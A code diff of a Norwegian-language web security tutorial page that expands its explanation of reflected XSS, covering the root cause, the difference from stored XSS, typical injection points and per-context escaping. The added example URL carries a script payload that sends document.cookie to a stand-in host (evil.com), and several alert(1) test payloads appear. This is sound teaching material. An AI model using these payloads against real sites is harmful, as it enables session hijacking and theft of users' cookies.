@@ -81,8 +81,25 @@
   <div class="container">
     <div class="section-badge">02 · Reflected XSS</div>
     <h2>Reflected <em>XSS</em></h2>
-    <p class="section-intro">Payloaden lever i URL-en og «reflekteres» tilbake i svaret — offeret må lures til å klikke lenken.</p>
-    <p class="lead">Et søkefelt returnerer «Du søkte på: <em>søkeord</em>» uten å escape søkeordet. En angriper konstruerer en URL som <code>/search?q=&lt;script&gt;...&lt;/script&gt;</code> og sender den til offeret via phishing. Nettleseren laster siden, serveren reflekterer payloaden i HTML-en, og skriptet kjøres.</p>
+    <p class="section-intro">Server tar imot brukerinput i en request og setter det rett inn i HTML-svaret uten escaping. Payloaden lever bare så lenge requesten lever — men én klikk på en preparert lenke er nok.</p>
+    <p class="lead">Et søkefelt returnerer «Du søkte på: <em>søkeord</em>» uten å escape søkeordet. En angriper konstruerer en URL som <code>/search?q=&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;</code>, sender den til offeret via phishing-e-post eller en chat-melding. Nettleseren laster siden, serveren reflekterer payloaden tilbake i HTML-en, nettleseren parser den som scripttag og kjører den i offerets sesjon.</p>
+
+    <h3>Hva er den faktiske feilen?</h3>
+    <p>Server behandler ikke input som <em>data</em> — det behandles som HTML-fragment. Når responsen renders, parser nettleseren payloaden i samme sikkerhetskontekst som resten av siden: full tilgang til cookies, DOM, sesjons-tokens, alt som tilhører domenet. Sårbarheten er ikke i klienten, ikke i nettleseren — det er i kodelinjen som konkatenerer brukerinput inn i et HTML-template uten escaping.</p>
+
+    <p>Forskjellen mot stored XSS er <em>varigheten</em>, ikke mekanismen:</p>
+    <ul>
+      <li><strong>Stored:</strong> payloaden lagres i DB → rammer alle som åpner siden senere → angriperen trenger ikke distribusjonskanal.</li>
+      <li><strong>Reflected:</strong> payloaden er i URL-en → rammer bare den som klikker den preparerte lenken → angriperen må distribuere lenken (phishing, sosiale medier, malicious ad).</li>
+    </ul>
+
+    <p>Reflected XSS oppstår særlig der HTML-respons inkluderer:</p>
+    <ul>
+      <li><strong>Søkeresultater:</strong> «Ingen treff for: <code>&lt;query&gt;</code>».</li>
+      <li><strong>Feilmeldinger:</strong> «Ugyldig input: <code>&lt;input&gt;</code>».</li>
+      <li><strong>Echo i skjemaer:</strong> et felt fylt ut feil og returnert med samme verdi pre-utfylt.</li>
+      <li><strong>URL-parametere brukt i JS:</strong> <code>var name = "&lt;%= req.query.name %&gt;"</code> — payloader som <code>"; alert(1); //</code> bryter ut av strengen.</li>
+    </ul>
 
     <pre><code><span class="comment">&lt;!-- Sårbar: søkeord satt inn direkte i HTML --&gt;</span>
 Du søkte på: {{ søkeord }}
@@ -93,7 +110,16 @@ Du søkte på: {{ søkeord | e }}
 <span class="comment">&lt;!-- Eller: bruk textContent i JavaScript, aldri innerHTML --&gt;</span>
 document.getElementById('result').textContent = søkeord;</code></pre>
 
-    <p>Reflected XSS er enkelt å teste for: søk etter <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> og se om dialogboksen dukker opp. Automatiserte scannere som OWASP ZAP oppdager det for deg. Likevel er det fortsatt svært vanlig.</p>
+    <p>Konteksten avgjør hvilken escaping som er riktig — én oppskrift dekker ikke alt:</p>
+    <ul>
+      <li><strong>HTML body:</strong> escape <code>&lt; &gt; &amp; " '</code> til entiteter (<code>&amp;lt;</code> osv.).</li>
+      <li><strong>HTML-attributt:</strong> samme + alltid omslutt med doble citater.</li>
+      <li><strong>JavaScript-kontekst:</strong> JSON-encoding, ikke HTML-escaping. <code>JSON.stringify(value)</code>.</li>
+      <li><strong>URL-kontekst:</strong> <code>encodeURIComponent</code>.</li>
+      <li><strong>CSS-kontekst:</strong> begrens til hex-fargekoder eller whitelisted verdier — escaping er kompleks og feil-prone.</li>
+    </ul>
+
+    <p>Reflected XSS er enkelt å teste for: søk etter <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> og se om dialogboksen dukker opp. Automatiserte scannere som OWASP ZAP oppdager det for deg. Likevel er det fortsatt svært vanlig — fordi escaping må gjøres <em>per kontekst</em> og utviklere glemmer attributt- og JS-konteksten selv om de husker HTML body.</p>
   </div>
 </section>
 
